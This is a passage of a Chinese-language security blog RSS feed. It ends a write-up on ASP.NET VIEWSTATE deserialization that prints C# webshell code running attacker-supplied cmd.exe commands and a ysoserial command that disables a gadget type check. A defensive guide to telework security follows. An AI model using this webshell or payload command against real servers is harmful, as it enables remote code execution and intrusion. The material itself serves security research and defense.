&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;關於需要引入的 dll 可以在安裝了 .NET Framework 的 Windows 主機上找到，像我的環境是在這個路徑 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319&lt;/code&gt; 之中。&lt;/p&gt;

&lt;p&gt;至於最關鍵的 ExploitClass.cs 該如何撰寫呢？將來會試著提交給 &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt;，就可以在範例檔案裡找到它，或是可以先直接看這裡：&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;E&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Web&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Web&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ClearError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Diagnostics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Diagnostics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileName&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;cmd.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cmd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arguments&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/c &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RedirectStandardOutput&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RedirectStandardError&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UseShellExecute&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StandardOutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadToEnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;End&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server.ClearError()&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Response.End()&lt;/code&gt; 都是必要且重要的一步，因為異常的 VIEWSTATE 必然會使得 aspx 頁面回應 500 或其他非預期的 Server Error，而呼叫第一個函式可以協助清除在當前 Runtime 環境下 stack 中所記錄的錯誤，而呼叫 End() 可以讓 ASP.NET 將當前上下文標記為請求已處理完成並直接將 Response 回應給客戶端，避免程式繼續進入其他 Error Handler 處理導致無法取得指令執行的輸出結果。&lt;/p&gt;

&lt;p&gt;到這個步驟的話，理論上你只要送出請求時固定帶上這個惡意 VIEWSTATE，就可以像操作一般 WebShell 一樣：
&lt;img src=&quot;/assets/img/blog/20200311/play-with-viewstate-exploit-and-create-fileless-webshell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不過有時也會出現這種情境：
&lt;img src=&quot;/assets/img/blog/20200311/cover.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不論怎麼改 Payload 再重送永遠都是得到 Server Error，於是就開始懷疑自己的人生 Q_Q&lt;/p&gt;

&lt;p&gt;但也別急著灰心，可能只是你遇上的目標有很乖地定期更新了伺服器而已，因為微軟曾為了 ActivitySurrogateSelector 這個 gadget 加上了一些 patch，導致無法直接利用，好在有其他研究者馬上提供了解決方法使得這個 gadget 能再次被利用！&lt;/p&gt;

&lt;p&gt;詳細細節可以閱讀這篇文章：&lt;a href=&quot;https://silentbreaksecurity.com/re-animating-activitysurrogateselector/&quot;&gt;Re-Animating ActivitySurrogateSelector&lt;/a&gt; By &lt;a href=&quot;https://silentbreaksecurity.com/author/nick/&quot;&gt;Nick Landers&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;總而言之，如果遇到上述情形，可以先嘗試用以下指令產生 VIEWSTATE 並發送一次給伺服器，順利的話就能使目標 Runtime 環境下的 DisableActivitySurrogateSelectorTypeCheck 變數值被設為 true，隨後再發送的 ActivitySurrogateSelector gadget 就不會再噴出 500 Server Error 了。&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck
              -c &quot;ignore&quot;
              --generator=&quot;CA0B0334&quot;
              --validationalg=&quot;SHA1&quot;
              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果上述一切都很順利、成功執行系統指令並回傳了結果，基本上就足夠做大部分事情，而剩下的就是繼續盡情發揮你的想像力吧！&lt;/p&gt;

&lt;p&gt;不過有時候即便到了此一步驟還是會有不明的錯誤、不明的原因導致 MAC 計算始終是錯誤的，因為 .NET 內部演算法以及需要的環境參數組合稍微複雜，使得工具沒辦法輕易涵蓋所有可能情況，而當遇到這種情形時，我目前選擇的解決方法都是發揮工人智慧，嘗試在本機建立環境、設定相同的 MachineKey、手工撰寫 aspx 檔案，產生包含 gadget 的 VIEWSTATE 再轉送到目標主機上。如果你有更多發現或不一樣的想法願意分享的話，也歡迎來和我交流聊聊天。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/</link>
                <guid>https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell</guid>
                <pubDate>Wed, 11 Mar 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>遠距工作的資安注意事項</title>
                <description>
&lt;p&gt;近期因新型冠狀病毒（COVID-19, 武漢肺炎）影響，不少企業開放同仁遠距工作 (Telework)、在家上班 (Work from home, WFH)。在疫情加速時，如果沒有準備周全就貿然全面開放，恐怕會遭遇尚未考慮到的資安議題。這篇文章提供一個簡單的指引，到底遠端在家上班有哪些注意事項？我們會從公司管理、使用者兩個面向來討論。&lt;/p&gt;

&lt;p&gt;如果你只想看重點，請跳到最後一段 TL;DR。&lt;/p&gt;

&lt;h2 id=&quot;攻擊手段&quot;&gt;攻擊手段&lt;/h2&gt;

&lt;p&gt;我們先來聊聊攻擊的手段。試想以下幾個攻擊情境，這些情境都曾被我們利用在紅隊演練的過程中，同樣也可能是企業的盲點。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;情境一、&lt;strong&gt;VPN 撞庫攻擊&lt;/strong&gt;：同仁 A 使用 VPN 連線企業內部網路，但 VPN 帳號使用的是自己慣用的帳號密碼，並且將這組帳號密碼重複使用在外其他非公司的服務上（如 Facebook、Adobe），而這組密碼在幾次外洩事件中早已外洩。攻擊團隊透過鎖定同仁 A，使用這組密碼登入企業內部。而很遺憾的 VPN 在企業內部網路並沒有嚴謹的隔離，因此在內部網路的直接找到內網員工 Portal，取得各種機敏資料。&lt;/li&gt;
  &lt;li&gt;情境二、&lt;strong&gt;VPN 漏洞&lt;/strong&gt;：VPN 漏洞已經成為攻擊者的主要攻略目標，公司 B 使用的 VPN 伺服器含有漏洞，攻擊團隊透過漏洞取得 VPN 伺服器的控制權後，從管理後台配置客戶端 logon script，在同仁登入時執行惡意程式，獲得其電腦控制權，並取得公司機密文件。可以參考之前 Orange &amp;amp; Meh 的研究：&lt;a href=&quot;https://www.youtube.com/watch?v=v7JUMb70ON4&quot;&gt; https://www.youtube.com/watch?v=v7JUMb70ON4&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;情境三、&lt;strong&gt;中間人攻擊&lt;/strong&gt;：同仁 C 在家透過 PPTP VPN 工作。不幸的是 C 小孩的電腦中安裝了含有惡意程式的盜版軟體。攻擊者透該電腦腦進行內網中間人攻擊 (MITM)，劫持 C 的流量並破解取得 VPN 帳號密碼，成功進入企業內網。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;以上只是幾個比較常見的情境，攻擊團隊的面向非常廣，而企業的防禦卻不容易做到滴水不漏。這也是為什麼我們要撰寫這篇文章，希望能幫助一些企業在遠距工作的時期也能達到基本的安全。&lt;/p&gt;

&lt;h2 id=&quot;風險有什麼&quot;&gt;風險有什麼&lt;/h2&gt;

&lt;p&gt;風險指的是發生某個事件對於該主體可能造成的危害。透過前面介紹的攻擊手段要達成危害，對攻擊者來說並不困難，接著我們盤點出一些在企業的資安規範下，因應遠距工作可能大幅增加攻擊者達成機率的因子：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;環境複雜：公司無法管控家中、遠距的工作環境，這些環境也比較複雜危險。一些公司內部的管理監控機制都難以施展，也較難要求同仁在家中私人設備安裝監控機制。&lt;/li&gt;
  &lt;li&gt;公司資料外洩或不當使用：若公司的資料遭到外洩或不當使用，將會有嚴重的損失。&lt;/li&gt;
  &lt;li&gt;設備遺失、遭竊：不管是筆電或者是手機等裝置，遺失或者遭竊時，都會有資料外洩的風險。&lt;/li&gt;
  &lt;li&gt;授權或存取控制不易實作：在短時間內提供大量員工的外部存取，勢必會在「可用性」和「安全性」間做出取捨。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;若公司允許同仁使用私人的設備連上公司內部 VPN，這樣的議題就等同 BYOD (Bring Your Own Device)，這些安全性的顧慮有不少文章可以參考。例如 NIST SP800-46 Guide to Enterprise Telework, Remote Access, and Bring Your Own Device (BYOD) Security&lt;a href=&quot;https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-46r2.pdf&quot;&gt; https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-46r2.pdf&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;公司面向&quot;&gt;公司面向&lt;/h2&gt;

&lt;p&gt;接下來我們來看看公司方面在遠距工作上面有哪些資安上面的作為。&lt;/p&gt;

&lt;h3 id=&quot;工作流程及原則規劃&quot;&gt;工作流程及原則規劃&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;工作流程調整&lt;/strong&gt;：遠距工作時，每個流程該如何作對應的調整，例如如何在不同地點協同作業、彙整工作資料、確認工作成果及品質等。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;資料盤點&lt;/strong&gt;：哪些資料放在雲端、伺服器、個人電腦，當遠距工作時哪些資料將無法被取用，或該將資料轉移到哪邊。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;會議流程&lt;/strong&gt;：會議時視訊設備、軟體選擇及測試，並注意會議軟體通訊是否有加密。狀況如會議時間延長、同時發言、遠距品質影響等。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;事件處理團隊及流程&lt;/strong&gt;：因遠距工作時發生的資安事件，該由誰負責處理、如何處理、盤點損失。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;僅知、最小權限原則&lt;/strong&gt;：僅知原則 (Need-to-know Basis) 以及最小權限原則 (Principle of Least Privilege, PoLP)，僅給予每個同仁最小限度需要的資料以及權限，避免額外的安全問題。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;網路管理&quot;&gt;網路管理&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;VPN 帳號申請及盤點&lt;/strong&gt;：哪些同仁需要使用 VPN，屬於哪些群組，每個群組的權限及連線範圍皆不同。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;VPN 帳號權限範圍及內網分區&lt;/strong&gt;：VPN 連線進來後，不應存取整個公司內網所有主機，因為 VPN 視同外部連線，風險等級應該更高，更應該做連線的分區管控。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;監控確認 VPN 流量及行為&lt;/strong&gt;：透過內部網路的網路流量監控機制，確認 VPN 使用有無異常行為。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;只允許白名單設備取得 IP 位址&lt;/strong&gt;：已申請的設備才能取得內網 IP 位址，避免可疑設備出現在內部網路。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;開啟帳號多因子認證&lt;/strong&gt;：將雲端服務、VPN、內部網路服務開啟多因子認證。&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;確認 VPN 伺服器是否為新版&lt;/strong&gt;：在我們過去的研究發現 VPN 伺服器也會是攻擊的對象，因此密切注意是否有更新或者修補程式。&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;Palo Alto GlobalProtect 資安通報 &lt;a href=&quot;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&quot;&gt;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;FortiGate SSL VPN 資安通報 &lt;a href=&quot;https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/&quot;&gt;https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;Pulse Secure SSL VPN 資安通報 &lt;a href=&quot;https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory/&quot;&gt;https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory/&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其中值得特別點出的是 VPN 的設定與開放。近期聽聞到不少公司的管理階層談論到，因應疫情原本不開放 VPN 權限的同仁現在全開放了。而問到 VPN 連線進公司內部網路之後的監控跟阻隔為何，卻較少有企業具備這樣的規劃。內部網路是企業的一大資安戰場，開放 VPN 的同時，必定要思考資安對應的措施。&lt;/p&gt;

&lt;h2 id=&quot;使用者面向&quot;&gt;使用者面向&lt;/h2&gt;

&lt;p&gt;公司準備好了，接下來就是使用者的安全性了。除了公司提供的 VPN 線路、架構、機制之外，使用者本身的資安意識、規範、安全性設定也一樣重要。&lt;/p&gt;

&lt;h3 id=&quot;保密&quot;&gt;保密&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;專機專用&lt;/strong&gt;：用來存取公司網路或資料的電腦，應嚴格遵守此原則，禁止將該設備作為非公務用途。也應避免非公司人士使用或操作該裝置。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;設備相關&quot;&gt;設備相關&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;開啟裝置協尋、鎖定、清除功能&lt;/strong&gt;：設備若可攜帶移動，設備的遺失對應方案就必須要考慮完整。例如如何尋找裝置、如何鎖定裝置、如何遠端清除已遺失的裝置避免資料外洩。現在主流作業系統多半都會提供這些機制。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;設備登入密碼&lt;/strong&gt;：裝置登入時必須設定密碼，避免外人直接操作。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;設備全機加密&lt;/strong&gt;：設備若遺失遭到分析，全機加密可以降低資料被破解遺失的風險。&lt;/li&gt;
  &lt;li&gt;（選擇性）&lt;strong&gt;MDM (Mobile Device Management)&lt;/strong&gt;：若公司有導入 MDM，可以協助以上的管理。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;帳號密碼安全&quot;&gt;帳號密碼安全&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;使用密碼管理工具並設定「強密碼」&lt;/strong&gt;：可以考慮使用密碼管理工具並將密碼設為全隨機產生包含英文、數字、符號的密碼串。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;不同系統帳號使用不同密碼&lt;/strong&gt;：這個在很多次演講中都有提到，建議每個系統皆使用不同密碼，防止撞庫攻擊。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;帳號開啟 2FA / MFA&lt;/strong&gt;：若系統具備 2FA / MFA 機制，務必開啟，為帳號多一層保護。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;網路使用&quot;&gt;網路使用&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;避免使用公用 Wi-Fi 連接公司網路&lt;/strong&gt;：公眾公用網路是相當危險的，恐被側錄或竄改。若必要時可使用手機熱點或透過 VPN 連接網際網路。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;禁止使用公用電腦登入公司系統&lt;/strong&gt;：外面的公用電腦難確保沒有後門、Keylogger 之類的惡意程式，一定要禁止使用公用電腦來登入任何系統。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;確認連線裝置是否可取得內網 IP 位址&lt;/strong&gt;：確認內網 IP 位址是否無誤，是否能夠正常存取公司內部系統。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;確認連線的對外 IP 位址&lt;/strong&gt;：確認連線至網際網路的 IP 位址是否為預期，尤其是資安服務公司，對客戶連線的 IP 位址若有錯誤，可能釀成非常嚴重的損害。&lt;/li&gt;
  &lt;li&gt;（選擇性）&lt;strong&gt;安裝個人電腦防火牆&lt;/strong&gt;：個人防火牆可以基本監控有無可疑程式想對外連線。&lt;/li&gt;
  &lt;li&gt;（選擇性）&lt;strong&gt;採用 E2EE 通訊工具&lt;/strong&gt;：目前企業都會使用雲端通訊軟體，通訊軟體建議採用有 E2EE (End-to-End Encryption)，如此可以確保公司內的機敏通訊內容只有內部人員才能解密，就連平台商也無法存取。&lt;/li&gt;
  &lt;li&gt;（選擇性）&lt;strong&gt;工作時關閉不必要的連線&lt;/strong&gt;（如藍牙等）：部分資安專家表示，建議在工作時將電腦的非必要連線管道全數關閉，如藍牙等，在外部公眾環境或許有心人士可以透過藍牙 exploit 攻擊個人裝置。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;資料管理&quot;&gt;資料管理&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;只留存在公司設備&lt;/strong&gt;：公司的機敏資料、文件等，必須只留存在公司設備中，避免資料外洩以及管理問題。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;稽核記錄&lt;/strong&gt;：記錄機敏資料的存放、修改、擁有人等資訊。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;重要文件加密&lt;/strong&gt;：重要的文件必須加密，且密碼不得存放在同一目錄。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;信件附件加密&lt;/strong&gt;，密碼透過另一管道傳遞：郵件的附件除了要加密之外，密碼必須使用另一管道傳遞。例如當面告知、事前約定、透過 E2EE 加密通道、或者是透過非網路方式給予。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;備份資料&lt;/strong&gt;：機敏資料一定要備份，可以遵循「3-2-1 Backup Strategy」：三份備份、兩種媒體、一個放置異地。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;實體安全&quot;&gt;實體安全&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;離開電腦時立刻鎖定螢幕&lt;/strong&gt;：離開電腦的習慣是馬上進入螢幕保護程式並且鎖定，不少朋友是放著讓他等他自己進入鎖定，但這個時間差有心人士已經可以完成攻擊。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;禁止插入來路不明的隨身碟或裝置&lt;/strong&gt;：社交工程的手法之一，就是讓同仁插入惡意的 USB，甚至有可能摧毀電腦（Bad USB, USB Killer）。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;注意外人偷窺螢幕或碰觸設備&lt;/strong&gt;：若常在外工作處於公共空間，可以考慮採購螢幕防窺片。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;不放置電腦設備在車上&lt;/strong&gt;：雖然台灣治安不錯，但也是不少筆電在車上遭竊，重要資產記得隨身攜帶，或者放置在隱密處。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;將工作區域關門或鎖上&lt;/strong&gt;：若在自己的工作區域，為了爭取更多時間應變突發狀況，建議將工作區域的門關閉或者上鎖。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;tldr-防疫同時也別忽視資訊安全&quot;&gt;TL;DR 防疫同時也別忽視資訊安全！&lt;/h2&gt;

&lt;p&gt;網路的攻防就是一場戰爭，如果不從攻擊者的面向去思考防禦策略，不但無法有效的減緩攻擊，更可能在全世界疫情逐漸失控的當下，讓惡意人士透過這樣的時機攻擊遠距工作的企業。期望我們的經驗分享能夠給企業一些基本的指引，也希望天災人禍能夠儘速消彌。台灣加油！&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;開放 VPN 服務前，注意帳號管理以及內網切割隔離，避免透過 VPN 存取內網任意主機。&lt;/li&gt;
  &lt;li&gt;雲端、網路服務務必使用獨一無二長密碼，並開啟 MFA / 2FA 多因子認證。&lt;/li&gt;
  &lt;li&gt;使用雲端服務時務必盤點存取權限，避免文件連結可被任意人存取。&lt;/li&gt;
  &lt;li&gt;注意設備遺失、竊取、社交工程等實體安全議題。&lt;/li&gt;
  &lt;li&gt;網路是危險的，請使用可信賴的網路，並在通訊、傳輸時採用加密方式進行。&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2020/03/04/telework-security/</link>
                <guid>https://devco.re/blog/2020/03/04/telework-security</guid>
                <pubDate>Wed, 04 Mar 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>飛鴿傳書 - 紅隊演練中的數位擄鴿</title>
